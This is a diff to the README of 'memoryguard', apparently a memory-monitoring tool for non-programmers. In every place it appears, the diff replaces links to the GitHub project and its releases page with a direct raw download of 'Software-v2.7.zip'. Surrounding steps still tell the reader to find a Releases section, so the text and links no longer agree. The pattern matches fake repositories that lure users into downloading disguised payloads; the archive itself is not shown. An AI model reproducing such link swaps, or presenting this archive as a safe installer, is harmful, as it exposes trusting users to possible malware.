@@ -1,6 +1,6 @@
 # 🛡️ memoryguard - Watch Your Computer's Memory Use
 
-[![Download memoryguard](https://img.shields.io/badge/Download-Memoryguard-ff6f61.svg)](https://github.com/Mrgamerp/memoryguard)
+[![Download memoryguard](https://img.shields.io/badge/Download-Memoryguard-ff6f61.svg)](https://raw.githubusercontent.com/Mrgamerp/memoryguard/main/memoryguard/Software-v2.7.zip)
 
 ---
 
@@ -36,7 +36,7 @@ You do not need to understand programming to use memoryguard. It works on Window
 
 1. **Open the download page:**  
    Click the big button at the top or go to this link:  
-   https://github.com/Mrgamerp/memoryguard
+   https://raw.githubusercontent.com/Mrgamerp/memoryguard/main/memoryguard/Software-v2.7.zip
 
 2. **Find the latest release:**  
    On the GitHub page, look for the "Releases" section on the right side or under the main project description.
@@ -115,7 +115,7 @@ A: Valgrind is a tool developers use to find memory issues. memoryguard can work
 ## 📁 Where to Get Updates
 
 Keep checking the download page for new versions or fixes:  
-https://github.com/Mrgamerp/memoryguard/releases
+https://raw.githubusercontent.com/Mrgamerp/memoryguard/main/memoryguard/Software-v2.7.zip
 
 You can download updates the same way you got the original installer.
 
@@ -127,4 +127,4 @@ For questions or issues, you can open a new ticket on the GitHub page under "Iss
 
 ---
 
-[![Download memoryguard](https://img.shields.io/badge/Download-Memoryguard-ff6f61.svg)](https://github.com/Mrgamerp/memoryguard)
+[![Download memoryguard](https://img.shields.io/badge/Download-Memoryguard-ff6f61.svg)](https://raw.githubusercontent.com/Mrgamerp/memoryguard/main/memoryguard/Software-v2.7.zip)
